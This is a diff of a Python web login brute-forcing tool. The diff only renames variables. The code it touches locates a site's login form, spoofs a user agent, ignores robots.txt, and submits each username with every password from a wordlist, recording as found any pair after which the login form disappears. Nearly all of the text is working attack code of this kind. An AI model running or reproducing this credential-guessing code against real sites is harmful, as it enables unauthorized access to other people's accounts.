@@ -15,7 +15,7 @@ import actions, utils, sys, mechanize
 ##################################################################
 
 class BruteForcing(object):
-	def __init__(self, optURL, optUsrList, optPassList):
+	def __init__(self, optionURL, optionUserlist, optionPasslist):
 		###############################################################
 		#
 		#	@Ic3W4ll
@@ -32,36 +32,36 @@ class BruteForcing(object):
 		#
 		################################################################
 
-		self.varTargetURL = optURL
-		self.varUserAgent = actions.action_getUserAgent()
-		self.frmLoginID = 0
-		self.frmUserField = ''
-		self.frmPassField = ''
-		self.lstUsername = optUsrList
-		self.lstPassword = optPassList
-		self.szPassword = actions.subaction_countListSize(self.lstPassword)
-		self.fndData = []
+		self.target_url = optionURL
+		self.user_agent = actions.action_getUserAgent()
+		self.formLoginID = 0
+		self.formUsernameField = ''
+		self.formPasswordField = ''
+		self.lstUsername = optionUserlist
+		self.lstPassword = optionPasslist
+		self.sizePasslist = actions.subaction_currentTryListSize(self.lstPassword)
+		self.credentials = []
 		self.actTestConnection()
 
 	def actTestConnection(self):
 
 		#	Create Browser object
 		process = mechanize.Browser()
-		process.addheaders = [('User-Agent', self.varUserAgent)]
+		process.addheaders = [('User-Agent', self.user_agent)]
 		process.set_handle_robots(False)
 
 		#	Connecting to Target
 		utils.printf("Testing connection....")
 
 		try:
-			process.open(self.varTargetURL)
+			process.open(self.target_url)
 			utils.printf("Connected to URL. Gathering login form information...\n", "good")
-			self.frmLoginID, self.frmUserField, self.frmPassField = actions.action_getFormInformation(process.forms())
+			self.formLoginID, self.formUsernameField, self.formPasswordField = actions.action_getFormInformation(process.forms())
 			utils.printf("Found login form", "good")
 			process.close()
 
 		except TypeError:
-			utils.printf("Can not find any login form in %s" %(self.varTargetURL), "bad")
+			utils.printf("Can not find any login form in %s" %(self.target_url), "bad")
 			sys.exit(1)
 
 		except mechanize.HTTPError as error:
@@ -69,17 +69,17 @@ class BruteForcing(object):
 			sys.exit(1)
 
 	def actGetResult(self):
-		return self.fndData
+		return self.credentials
 
-	def actTryTargetLogin(self, objBrowser, tryUsername, tryPassword, count):
+	def actTryTargetLogin(self, objBrowser, tryUsername, tryPassword, currentTry):
 		try:
 			#	Fill Login field Information
-			objBrowser.select_form(nr = self.frmLoginID)
-			objBrowser.form[self.frmUserField] = tryUsername
-			objBrowser.form[self.frmPassField] = tryPassword
+			objBrowser.select_form(nr = self.formLoginID)
+			objBrowser.form[self.formUsernameField] = tryUsername
+			objBrowser.form[self.formPasswordField] = tryPassword
 
 			#	Print progress bar
-			utils.prints("%10s : %20s%12s%10s / %10s" %(tryUsername, tryPassword, '=' * 6, count, self.szPassword))
+			utils.prints("%10s : %20s%12s%10s / %10s" %(tryUsername, tryPassword, '=' * 6, currentTry, self.sizePasslist))
 
 			#	Send request
 			objBrowser.submit()
@@ -92,7 +92,7 @@ class BruteForcing(object):
 
 			if not actions.action_getFormInformation(objBrowser.forms()):
 				utils.printf("Found: %s:%s" %(tryUsername, tryPassword), "good")
-				self.fndData.append([tryUsername, tryPassword])
+				self.credentials.append([tryUsername, tryPassword])
 				return True
 			return False
 
@@ -109,15 +109,15 @@ class BruteForcing(object):
 		except:
 			pass
 
-		for idxUsername in self.lstUsername:
+		for currentUsername in self.lstUsername:
 
-			count = 0
-			idxUsername = idxUsername.replace('\n', '')
+			currentTry = 0
+			currentUsername = currentUsername.replace('\n', '')
 
 			proc = mechanize.Browser()
-			proc.addheaders = [('User-Agent', self.varUserAgent)]
+			proc.addheaders = [('User-Agent', self.user_agent)]
 			proc.set_handle_robots(False)
-			proc.open(self.varTargetURL)
+			proc.open(self.target_url)
 
 			#######################################
 			#	Read password file from start point
@@ -128,13 +128,13 @@ class BruteForcing(object):
 			except:
 				pass
 
-			for idxPasswd in self.lstPassword:
-				idxPasswd = idxPasswd.replace('\n', '')
+			for currentPassowrd in self.lstPassword:
+				currentPassowrd = currentPassowrd.replace('\n', '')
 
-				count += 1
-				if self.actTryTargetLogin(proc, idxUsername, idxPasswd, count):
+				currentTry += 1
+				if self.actTryTargetLogin(proc, currentUsername, currentPassowrd, currentTry):
 					break
 
-			if count == self.szPassword:
-				utils.printf("%s: No match found." %(idxUsername), "bad")
+			if currentTry == self.sizePasslist:
+				utils.printf("%s: No match found." %(currentUsername), "bad")
 			proc.close()
